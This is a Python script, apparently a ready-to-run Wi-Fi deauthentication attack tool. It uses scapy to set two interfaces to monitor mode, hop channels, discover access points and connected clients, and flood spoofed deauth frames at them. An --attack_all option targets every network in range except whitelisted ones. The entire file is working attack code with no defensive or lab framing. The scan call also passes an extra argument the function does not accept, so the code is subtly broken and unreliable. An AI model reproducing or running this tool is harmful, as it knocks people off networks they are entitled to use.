import argparse
import subprocess
import time
import sys
from typing import List, Tuple
from loguru import logger
import concurrent.futures
from scapy.all import sniff, sendp #, RadioTap, Dot11, Dot11Deauth, Dot11Elt
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11Elt

# Constants
INTERFACE_MONITOR_1 = "wlan1"
INTERFACE_MONITOR_2 = "wlan2"


# Remove default handler and configure loguru to log to stdout
logger.remove()
logger.add(sys.stdout, format="{time} - {level} - {message}", level="INFO")


# Initialize arguments
parser = argparse.ArgumentParser(description="Deauth unwanted users from Wi-Fi network.")
parser.add_argument("--death_reasons", nargs='+', type=int, default=[1, 2, 3, 4, 6, 7, 8, 10], help="List of deauth codes to be sent sequentially to the target.")
parser.add_argument("--death_seq", type=int, default=1, help="Number of packets for each reason to be sent at once.")
parser.add_argument("--whitelist_ap", nargs='+', default=[], help="Ignore these ESSID or BSSID APs from attacking.")
parser.add_argument("--whitelist_client", nargs='+', default=[], help="Ignore these clients from attacking.")
parser.add_argument("--blacklist_ap", nargs='+', default=[], help="List of ESSID or BSSID AP targets.")
parser.add_argument("--blacklist_client", nargs='+', default=[], help="List of client targets.")
parser.add_argument("--attack_all", action='store_true', help="Allows to use empty blacklist lists and attacks all found, except for whitelist.")
parser.add_argument("--channel_list", nargs='+', type=int, required=True, help="Channels to hop.")
parser.add_argument("--channel_wait", type=int, default=30, help="For how long to stay on a selected channel before hopping.")
parser.add_argument("--scan_wait", type=int, default=10, help="For how long to scan")
args = parser.parse_args()


def set_monitor_mode(interface: str) -> None:
    """
    Sets the specified wireless interface to monitor mode.
    
    :param interface: The name of the wireless interface.
    """
    try:
        logger.info(f"Setting {interface} to monitor mode")
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to set monitor mode on {interface}: {e}")


def set_channel(interface: str, channel: int) -> None:
    """
    Sets the specified wireless interface to the given channel.
    
    :param interface: The name of the wireless interface.
    :param channel: The channel number to set.
    """
    try:
        logger.info(f"Setting {interface} to channel {channel}")
        subprocess.run(["iwconfig", interface, "channel", str(channel)], check=True)
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to set channel {channel} on {interface}: {e}")


def scan_networks(interface: str) -> Tuple[List[Tuple[str, str]], List[str]]:
    """
    Scans for networks and connected clients on the specified interface.
    
    :param interface: The name of the wireless interface.
    :return: A tuple containing a list of APs (each as a tuple of SSID and BSSID) and a list of client MAC addresses.
    """
    ap_list: List[Tuple[str, str]] = []
    client_list: List[str] = []

    def packet_handler(pkt) -> None:
        if pkt.haslayer(Dot11):
            bssid = pkt.addr2.lower() if pkt.addr2 else ''
            if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
                ssid = pkt.info.decode() if pkt.haslayer(Dot11Elt) else ''
                if (ssid, bssid) not in ap_list:
                    ap_list.append((ssid, bssid))
            elif pkt.type == 2 and pkt.addr3 == bssid:  # Data frames
                client = pkt.addr1.lower() if pkt.addr1 and ':' in pkt.addr1 else pkt.addr2.lower()
                if client not in client_list:
                    client_list.append(client)

    try:
        logger.info(f"Scanning networks on {interface}")
        sniff(iface=interface, prn=packet_handler, timeout=args.scan_wait, store=0)
    except Exception as e:
        logger.error(f"Error while scanning networks: {e}")
    return ap_list, client_list


def create_deauth_packet(src: str, dst: str, bssid: str, reason: int) -> RadioTap:
    """
    Creates a deauthentication packet.
    
    :param src: Source MAC address (client or AP sending the deauth).
    :param dst: Destination MAC address (client or AP receiving the deauth).
    :param bssid: BSSID of the AP.
    :param reason: Reason code for the deauth.
    :return: The created deauthentication packet.
    """
    dot11 = Dot11(addr1=dst, addr2=src, addr3=bssid)
    return RadioTap() / dot11 / Dot11Deauth(reason=reason)


def send_deauth_packets(interface: str, target: str, bssid: str, reasons: List[int], seq: int) -> None:
    """
    Sends deauthentication packets to the target.
    
    :param interface: The name of the wireless interface.
    :param target: The target MAC address to deauth.
    :param bssid: The BSSID of the AP.
    :param reasons: List of reason codes to be sent.
    :param seq: Number of packets for each reason to be sent at once.
    """
    try:
        for reason in reasons:
            packet = create_deauth_packet(src=target, dst=bssid, bssid=bssid, reason=reason)
            sendp(packet, iface=interface, count=seq, inter=0.1, verbose=0)
            logger.info(f"Sent deauth packets to {target} from BSSID {bssid} with reason {reason}")
    except Exception as e:
        logger.error(f"Error while sending deauth packets: {e}")


def deauth_process() -> None:
    """
    Main process for performing deauthentication attacks.
    """
    if not args.channel_list:
        logger.error("Channel list is empty. At least one channel must be provided.")
        return

    while True:
        for channel in args.channel_list:
            logger.info(f"Switching to channel {channel}")
            set_channel(INTERFACE_MONITOR_1, channel)
            set_channel(INTERFACE_MONITOR_2, channel)

            start_time = time.time()
            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                future_scan = executor.submit(scan_networks, INTERFACE_MONITOR_1, channel)
                
                while (time.time() - start_time) < args.channel_wait:
                    if future_scan.done():
                        try:
                            ap_list, client_list = future_scan.result()
                            logger.info(f"Found {len(ap_list)} APs and {len(client_list)} clients on channel {channel}")

                            for ssid, bssid in ap_list:
                                if (bssid in args.whitelist_ap) or (ssid in args.whitelist_ap):
                                    continue
                                if args.attack_all or (bssid.lower() in args.blacklist_ap or ssid in args.blacklist_ap):
                                    for client in client_list:
                                        if client in args.whitelist_client:
                                            continue
                                        if args.attack_all or client in args.blacklist_client:
                                            logger.info(f"Deauthing client {client} from BSSID {bssid} (SSID: {ssid})")
                                            executor.submit(send_deauth_packets, INTERFACE_MONITOR_2, target=client, bssid=bssid, reasons=args.death_reasons, seq=args.death_seq)

                            future_scan = executor.submit(scan_networks, INTERFACE_MONITOR_1, channel)  # Resubmit the scanning task
                        except Exception as e:
                            logger.error(f"Error in future result: {e}")

            logger.info(f"Finished operations for channel {channel}. Hopping to next channel.")


def main() -> None:
    """
    Entry point for the script. Sets up interfaces and starts the deauth process.
    """
    try:
        logger.info("Setting interfaces to monitor mode")
        set_monitor_mode(INTERFACE_MONITOR_1)
        set_monitor_mode(INTERFACE_MONITOR_2)
        deauth_process()
    except KeyboardInterrupt:
        logger.info("Interrupted by user, shutting down...")
    except Exception as e:
        logger.error(f"An error occurred: {e}")
    finally:
        logger.info("Restoring network interfaces...")
        try:
            subprocess.run(["ifconfig", INTERFACE_MONITOR_1, "down"], check=True)
            subprocess.run(["iwconfig", INTERFACE_MONITOR_1, "mode", "managed"], check=True)
            subprocess.run(["ifconfig", INTERFACE_MONITOR_1, "up"], check=True)
            subprocess.run(["ifconfig", INTERFACE_MONITOR_2, "down"], check=True)
            subprocess.run(["iwconfig", INTERFACE_MONITOR_2, "mode", "managed"], check=True)
            subprocess.run(["ifconfig", INTERFACE_MONITOR_2, "up"], check=True)
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to restore network interfaces: {e}")


if __name__ == "__main__":
    main()
